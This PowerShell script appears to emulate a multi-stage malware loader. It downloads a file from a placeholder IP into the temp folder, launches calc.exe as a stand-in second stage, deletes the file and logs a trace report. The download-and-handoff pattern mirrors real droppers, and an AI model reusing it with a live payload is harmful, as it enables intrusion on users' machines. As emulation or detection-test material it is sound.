
[CmdletBinding()]
param(
    [string]$TargetUrl = 'https://192.0.2.195:8443/stage1.ps1',
    [string]$DownloadPath = "$env:TEMP\stage2.bin",
    [string]$TracePath = "$env:TEMP\report.txt",
    [int]$StageTimeout = 99
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 99
    )

    Write-Verbose ("Downloading first stage from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    if (-not (Test-Path -Path $DestinationPath)) {
        throw "First stage was not written to disk"
    }
    return $DownloadedPath = $DestinationPath
}

function Invoke-Stage2Execution {
    [CmdletBinding()]
    param(
        [string]$StagedPath = '',
        [int]$DelaySeconds = 2
    )

    Write-Verbose ("Preparing handoff for " + $StagedPath)
    Start-Sleep -Seconds $DelaySeconds
    Start-Process -FilePath "calc.exe"
    Write-Verbose "Second stage handoff complete"
    return $true
}

try {
    Write-Verbose "Starting multi-stage workflow"
    $TransferResult = Invoke-Stage1Download -SourceUrl $TargetUrl -DestinationPath $DownloadPath -TimeoutSec $StageTimeout
    if ($TransferResult) {
        $HandoffResult = Invoke-Stage2Execution -StagedPath $DownloadPath
        Write-Verbose ("Handoff result: " + $HandoffResult)
    }
    else {
        Write-Warning "First stage did not complete"
    }
}
catch {
    Write-Warning "Multi-stage workflow failed: $($_.Exception.Message)"
}

$StageSummary = [ordered]@{
    Stage1 = "download"
    Stage2 = "handoff"
    Endpoint = $TargetUrl
    Destination = $DownloadPath
    TimeoutSec = $StageTimeout
}
$StageSummary | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Exporting operation report"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Resolving configured target"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Validating result"
Write-Verbose "Starting workflow"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
Write-Output "stage 42 initialized"
Start-Sleep -Seconds 20
